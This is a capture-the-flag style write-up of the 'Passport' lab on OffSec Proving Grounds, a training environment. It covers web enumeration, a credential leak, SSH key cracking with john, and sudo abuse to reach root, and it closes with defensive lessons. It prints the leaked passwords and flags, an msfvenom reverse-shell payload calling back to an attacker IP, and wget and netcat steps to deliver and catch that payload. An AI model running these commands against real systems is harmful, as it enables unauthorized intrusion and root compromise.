# 🐧 Passport — Proving Grounds Practice Writeup

> **Platform:** Offensive Security Proving Grounds Practice
> **Difficulty:** Intermediate
> **OS:** Linux (Ubuntu 20.04.6 LTS)
> **Author:** [Tanvir Ahmed](https://github.com/Tanvir-2) | [Portfolio](https://tanvirkarim.it)
> **Status:** ✅ Completed
> **Tags:** `FTP` `Web Enumeration` `IDOR` `Credential Leak` `SSH Key Cracking` `John The Ripper` `Sudo Misconfiguration` `Privilege Escalation`

---

## 📋 Table of Contents

1. [Lab Overview](#lab-overview)
2. [Reconnaissance](#reconnaissance)
3. [Web Enumeration](#web-enumeration)
4. [Credential Discovery — Message Log Leak](#credential-discovery--message-log-leak)
5. [FTP Access & SSH Key Recovery](#ftp-access--ssh-key-recovery)
6. [Cracking the SSH Key Passphrase](#cracking-the-ssh-key-passphrase)
7. [Initial Access](#initial-access)
8. [Privilege Escalation — Sudo Binary Misconfiguration](#privilege-escalation--sudo-binary-misconfiguration)
9. [Flags](#flags)
10. [Attack Chain](#-attack-chain)
11. [Skills Demonstrated](#-skills-demonstrated)
12. [Lessons Learned](#-lessons-learned)
13. [References](#references)
14. [Tools Used](#tools-used)

---

## 🛂 Lab Overview

| Field | Details |
|-------|---------|
| **Target IP** | `192.168.117.112` |
| **Hostname** | `passport` |
| **OS** | Ubuntu 20.04.6 LTS (Kernel 5.4.0-193) |
| **Difficulty** | Intermediate |
| **Focus Areas** | Web enumeration, credential leakage, SSH key cracking, sudo misconfiguration |

**Lab Summary:**
Passport is an intermediate Linux box that chains a web-based information disclosure into full root compromise. Directory brute-forcing uncovers a message-log endpoint leaking a user's FTP password. FTP access yields a passphrase-protected SSH private key, cracked offline with John the Ripper. From the resulting user shell, a dangerously permissive `sudo` rule allowing a user-writable binary to run as root delivers a trivial escalation to `root`.

---

## 🔍 Reconnaissance

### Port Scan

```bash
nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.117.112
```

<img width="1676" height="706" alt="image" src="https://github.com/user-attachments/assets/28f84ef5-04d0-4df9-9e1b-fa3733cf0263" />


### Results

| Port | State | Service | Version/Details |
|------|-------|---------|-----------------|
| 21/tcp | open | ftp | vsftpd 3.0.5 |
| 22/tcp | open | ssh | OpenSSH 8.2p1 Ubuntu (ED25519 host key) |
| 80/tcp | open | http | Apache httpd 2.4.41 (Ubuntu) — Nicepage 6.15.2 |

**Key Findings:**
- FTP (`vsftpd 3.0.5`) present — worth testing once credentials surface
- SSH open for lateral/initial access
- HTTP hosting a "Passport Expiry Reminder" site built with the Nicepage page builder — the primary enumeration target

---

## 🌐 Web Enumeration

### Landing Page — Port 80

Browsing to `http://192.168.117.112` reveals a "Passport Expiry Reminder" themed site ("Never miss a trip").

<img width="1230" height="798" alt="image" src="https://github.com/user-attachments/assets/9842225e-1659-437d-aef7-2add57d558b3" />


### Directory Brute-Force

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -u http://192.168.117.112
```

<img width="1465" height="463" alt="image" src="https://github.com/user-attachments/assets/805ef81e-cc0a-4e57-a699-d32823cece38" />


**Discovered paths:**
```
/css          (Size: 316)
/js           (Size: 315)
/acct_login   (Size: 323)
```

`/acct_login/` returns **403 Forbidden** — but a forbidden directory often still hides accessible sub-paths, so enumeration continues downward.

<img width="871" height="305" alt="image" src="https://github.com/user-attachments/assets/254f0297-1268-44ad-8bbb-9f58985e8cec" />


### Enumerate Inside `/acct_login/`

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -u http://192.168.117.112/acct_login/
```

<img width="1508" height="461" alt="image" src="https://github.com/user-attachments/assets/26d0cc52-da37-4218-8bf6-e11d877ec060" />


**Discovered:**
```
/trace   (Size: 329)
```

### Enumerate Inside `/acct_login/trace/`

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -u http://192.168.117.112/acct_login/trace/
```

<img width="902" height="303" alt="image" src="https://github.com/user-attachments/assets/cee1f34f-0c23-4acc-a10c-a93ca507e16f" />


**Discovered numeric endpoints (IDOR-style resource IDs):**
```
/1    (Size: 1304)
/10   (Size: 1247)
/2    (Size: 1192)
/46   (Size: 1307)
/51   (Size: 1269)
/63   (Size: 1249)
/97   (Size: 1249)
```

> **⚠️ Insight:** Sequential numeric endpoints under `trace/` behave like directly-referenced objects (IDOR). Each renders a stored message-log entry — no authentication enforced.

---

## 🔑 Credential Discovery — Message Log Leak

Visiting the numeric endpoints reveals an internal **MESSAGE LOG** — a conversation between two staff accounts discussing account credentials.

```
http://192.168.117.112/acct_login/trace/51
```

<img width="1024" height="830" alt="image" src="https://github.com/user-attachments/assets/97482ca0-daff-4ec4-a7e3-ad020167eb03" />


**Message thread (`luigi@passport.offsec` ↔ `diego@passport.offsec`):**
```
luigi: I cannot access the reserved area... It says the password is wrong.
diego: I was able to login... Is your account's password still "Serendipity1902@"?
luigi: No, my accounts with that password were breached so I had to change it...
diego: Yeah it was a you problem, now you should be able to login.
```

The thread leaks a valid credential for **luigi**:

```
Username: luigi
Password: Serendipity1903@
```

---

## 📂 FTP Access & SSH Key Recovery

### Authenticate to FTP as luigi

```bash
ftp 192.168.117.112
# Name: luigi
# Password: Serendipity1903@
```

<img width="542" height="269" alt="image" src="https://github.com/user-attachments/assets/c7844fb8-1690-476b-8596-32f6a50508fa" />


```
230 Login successful.
```

### List and Download Files

```bash
ftp> ls
-rw-r--r--  1 1001 1001  3434 Sep 02 2024 ssh.bak
drwxr-xr-x  2 1001 1001  4096 Sep 02 2024 uploads

ftp> get ssh.bak
```

<img width="794" height="220" alt="image" src="https://github.com/user-attachments/assets/e0a097ab-751e-4426-93ab-39bd47011150" />
<img width="907" height="207" alt="image" src="https://github.com/user-attachments/assets/0d12f743-8b9b-4295-8899-198d4284a555" />


> **🎯 Key Finding:** `ssh.bak` is a backup of an SSH **private key** (3434 bytes). If crackable, it grants direct SSH access as luigi.

---

## 🔓 Cracking the SSH Key Passphrase

### Convert Key to John Format

```bash
ssh2john ssh.bak > hash.txt
```

<img width="401" height="69" alt="image" src="https://github.com/user-attachments/assets/5cd2b58d-a9ad-47c4-ba91-81de84b3ef94" />


### Crack the Passphrase

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
<img width="1044" height="273" alt="image" src="https://github.com/user-attachments/assets/d693f077-4c7f-4dab-bfb3-32f1382850e8" />


**Result:**
```
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Passphrase: flowerpower
```

---

## 🚪 Initial Access

### SSH with the Recovered Key

```bash
chmod 600 ssh.bak
ssh luigi@192.168.117.112 -i ssh.bak
# Enter passphrase for key 'ssh.bak': flowerpower
```

<img width="1057" height="805" alt="image" src="https://github.com/user-attachments/assets/feea76f1-d209-4382-97f1-62955a897476" />


```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-193-generic x86_64)
```

### Local Flag

```bash
luigi@passport:~$ ls
ftp-vault  local.txt
luigi@passport:~$ cat local.txt
```

<img width="541" height="178" alt="image" src="https://github.com/user-attachments/assets/f5ca8d5b-7de5-4d66-b1f1-3aa9d141f153" />

```
4b15c44cc82597a642fbf923eb09741
```

---

## 🔺 Privilege Escalation — Sudo Binary Misconfiguration

### Enumerate Sudo Rights

```bash
sudo -l
```

<img width="878" height="165" alt="image" src="https://github.com/user-attachments/assets/3301d0af-e387-4284-9c6f-3f537ec13412" />


```
User luigi may run the following commands on passport:
    (ALL) NOPASSWD: /tmp/base64 /home/*
```

> **🎯 Critical Misconfiguration:** luigi may run `/tmp/base64` as **root** without a password, taking any argument under `/home/*`. The `sudo` rule pins the *path* (`/tmp/base64`) but **never verifies what that binary actually is** — and `/tmp` is world-writable. luigi can simply place a malicious binary at `/tmp/base64` and have root execute it. The `/home/*` argument is irrelevant to a payload that ignores its arguments.

### Craft a Reverse Shell Payload

On the attacker machine, generate an ELF reverse shell and name it `base64`:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.169 LPORT=80 -f elf > base64
```

<img width="986" height="179" alt="image" src="https://github.com/user-attachments/assets/6d8cc29c-95bb-41d0-a308-336e307e1e0e" />


### Transfer the Payload to `/tmp`

Serve the payload:
```bash
python3 -m http.server 80
```

On the target, download it into `/tmp` as `base64`:
```bash
cd /tmp
wget http://192.168.45.169/base64
chmod +x base64
```

<img width="1638" height="229" alt="image" src="https://github.com/user-attachments/assets/dd9331d9-c5aa-49f2-9925-9dd67599a61e" />

### Start the Listener

```bash
nc -lvnp 80
```

### Trigger via Sudo

```bash
sudo /tmp/base64 /home/luigi/local.txt
```

<img width="713" height="92" alt="image" src="https://github.com/user-attachments/assets/59c8f0eb-92c8-4b02-9677-4be4c0ed5d5c" />


The `/home/luigi/local.txt` argument satisfies the `sudo` rule's `/home/*` pattern; the payload ignores it and fires the reverse shell as **root**.

### Root Shell Received

<img width="892" height="412" alt="image" src="https://github.com/user-attachments/assets/472a46f2-bc7a-4312-ba6a-9c01daccec48" />


```
connect to [192.168.45.169] from (UNKNOWN) [192.168.117.112] 60788
/bin/bash -i
root@passport:/tmp#
```

---

## 🚩 Flags

```bash
root@passport:/tmp# cd /root
root@passport:/root# cat proof.txt
```

<img width="657" height="274" alt="image" src="https://github.com/user-attachments/assets/437b2d4c-2d96-476c-9f5a-7e8a97d78a26" />


| Flag | Location | Value |
|------|----------|-------|
| **local.txt** | `/home/luigi/local.txt` | `4b15c44cc82597a642fbf923eb09741` |
| **proof.txt** | `/root/proof.txt` | `693374b863ca0a94ddd5d8025e221c9` |

---

## 🗺️ Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────┐
│                       PASSPORT — ATTACK CHAIN                          │
└─────────────────────────────────────────────────────────────────────────┘

[Attacker 192.168.45.169]
        │
        │ 1. Nmap → 21 (vsftpd), 22 (OpenSSH), 80 (Apache/Nicepage)
        ▼
[Web :80 — "Passport Expiry Reminder"]
        │
        │ 2. gobuster → /acct_login (403 Forbidden)
        │ 3. gobuster /acct_login/ → /trace
        │ 4. gobuster /acct_login/trace/ → numeric IDs (1,2,10,46,51,63,97)
        ▼
[Message Log Leak — /acct_login/trace/51]
        │
        │ 5. Internal staff thread leaks credential:
        │        luigi : Serendipity1903@
        ▼
[FTP :21 — luigi]
        │
        │ 6. Authenticate → ssh.bak (SSH private key backup)
        │ 7. get ssh.bak
        ▼
[Offline Crack]
        │
        │ 8. ssh2john ssh.bak > hash.txt
        │ 9. john --wordlist=rockyou.txt → passphrase: flowerpower
        ▼
[Initial Shell: luigi via SSH key]
        │
        │ 10. cat local.txt → 4b15c44cc82597a642fbf923eb09741
        │ 11. sudo -l → (ALL) NOPASSWD: /tmp/base64 /home/*  ⭐
        ▼
[Privilege Escalation — writable sudo binary]
        │
        │ 12. msfvenom linux/x86/shell_reverse_tcp → ELF named "base64"
        │ 13. wget into /tmp/base64 ; chmod +x
        │ 14. nc -lvnp 80  (listener)
        │ 15. sudo /tmp/base64 /home/luigi/local.txt → fires as root
        ▼
[Root Shell]
        │
        │ 16. cat /root/proof.txt → 693374b863ca0a94ddd5d8025e221c9
        ▼
[🏆 PWNED]
```

---

## 🛡️ Skills Demonstrated

| # | Skill | MITRE ATT&CK Technique | TTP ID |
|---|-------|------------------------|--------|
| 1 | Port scanning & service fingerprinting | Network Service Discovery | T1046 |
| 2 | Web directory brute-forcing | Active Scanning: Wordlist Scanning | T1595.003 |
| 3 | IDOR / insecure direct object reference | Exploit Public-Facing Application | T1190 |
| 4 | Credential harvesting from exposed data | Unsecured Credentials | T1552 |
| 5 | FTP authentication with leaked creds | Valid Accounts | T1078 |
| 6 | Private SSH key exfiltration | Unsecured Credentials: Private Keys | T1552.004 |
| 7 | Offline passphrase cracking (ssh2john/John) | Brute Force: Password Cracking | T1110.002 |
| 8 | SSH key-based remote access | Remote Services: SSH | T1021.004 |
| 9 | Sudo privilege enumeration | System Owner/User Discovery | T1033 |
| 10 | Sudo binary-path misconfiguration abuse | Abuse Elevation Control: Sudo | T1548.003 |
| 11 | msfvenom payload generation | Command and Scripting Interpreter | T1059.004 |
| 12 | Ingress payload transfer (wget/http.server) | Ingress Tool Transfer | T1105 |

---

## 📚 Lessons Learned

### 🔴 Offensive Perspective

1. **A 403 is not a dead end.** `/acct_login/` returned Forbidden, but recursive enumeration of its children exposed the entire `trace/` message store. Always brute-force *beneath* forbidden directories rather than abandoning them.

2. **Sequential numeric endpoints scream IDOR.** When directory enumeration surfaces `/1`, `/2`, `/10`, `/51`… with no auth gate, iterate every ID. Here a single message-log entry handed over a plaintext credential.

3. **Backup files are gold.** `ssh.bak` is exactly the kind of artifact developers leave behind. Private keys — even passphrase-protected ones — should always be pulled and run through `ssh2john` + `rockyou`.

4. **Read the sudo rule literally.** `NOPASSWD: /tmp/base64 /home/*` binds a *path in a writable directory*, not a trusted system binary. The fastest win isn't abusing the real `base64` — it's *becoming* `/tmp/base64` with a payload of your choosing. Path-based sudo rules over writable locations are equivalent to handing out root.

### 🔵 Defensive Perspective

1. **Never expose internal message logs unauthenticated.** The `trace/` endpoints should require authentication and enforce object-level authorization so one user cannot read another's records. Enumerable integer IDs should be replaced with unguessable UUIDs *and* access-controlled.

2. **Never transmit or discuss credentials in application data.** The compromise began with a plaintext password sitting in a readable log. Secrets belong in a vault, never in message bodies, tickets, or code comments.

3. **Protect and rotate private keys; enforce strong passphrases.** `flowerpower` fell instantly to `rockyou.txt`. SSH key backups must never be world-readable over FTP, and passphrases must resist dictionary attacks. Better still, avoid key backups on network-facing services entirely.

4. **Pin sudo rules to trusted, immutable paths.** A `sudo` entry must point to a root-owned binary in a non-writable directory (e.g., `/usr/local/bin/`), never `/tmp` or any world-writable location. Prefer full argument validation, `NOEXEC` where possible, and the narrowest command specification. Audit `sudoers` regularly with tools like `sudo -l` reviews and automated policy scanning.

### 🟡 Key Takeaways

- **Enumeration depth wins boxes** — the whole chain hinged on drilling past a 403 into nested numeric endpoints.
- **One leaked secret cascades** — a single logged password unlocked FTP → SSH key → user shell.
- **Writable-path sudo rules are a top-tier Linux privesc primitive** — always cross-check the *location* of any sudo-allowed binary, not just its name.
- **Offline cracking is patient and cheap** — passphrase-protected keys are only as strong as their passphrase.

---

## 📎 References

| Resource | URL |
|----------|-----|
| GTFOBins — Sudo | https://gtfobins.github.io/#+sudo |
| John the Ripper — ssh2john | https://www.openwall.com/john/ |
| MITRE ATT&CK — Unsecured Credentials: Private Keys | https://attack.mitre.org/techniques/T1552/004/ |
| MITRE ATT&CK — Abuse Elevation Control: Sudo | https://attack.mitre.org/techniques/T1548/003/ |
| MITRE ATT&CK — IDOR / Exploit Public-Facing App | https://attack.mitre.org/techniques/T1190/ |
| OWASP — Insecure Direct Object Reference | https://owasp.org/www-community/vulnerabilities/ |
| Offensive Security Proving Grounds | https://www.offsec.com/labs/individual/ |

---

## 🧰 Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service fingerprinting |
| `gobuster` | Web directory brute-forcing |
| Web browser | Reading leaked message-log endpoints |
| `ftp` (CLI) | Authenticated FTP access, `ssh.bak` retrieval |
| `ssh2john` | Converting SSH private key to a crackable hash |
| `john` | Offline passphrase cracking (rockyou.txt) |
| `ssh` | Key-based remote access as luigi |
| `msfvenom` | Linux reverse-shell ELF generation |
| `python3 -m http.server` / `wget` | Payload transfer to target |
| `nc` (netcat) | Reverse-shell listener |

---

<div align="center">

**[⬅ Back to Portfolio](https://github.com/Tanvir-2) | [🌐 tanvirkarim.it](https://tanvirkarim.it)**

*Passport — Proving Grounds Practice | Intermediate | Linux Web-to-Root*

</div>
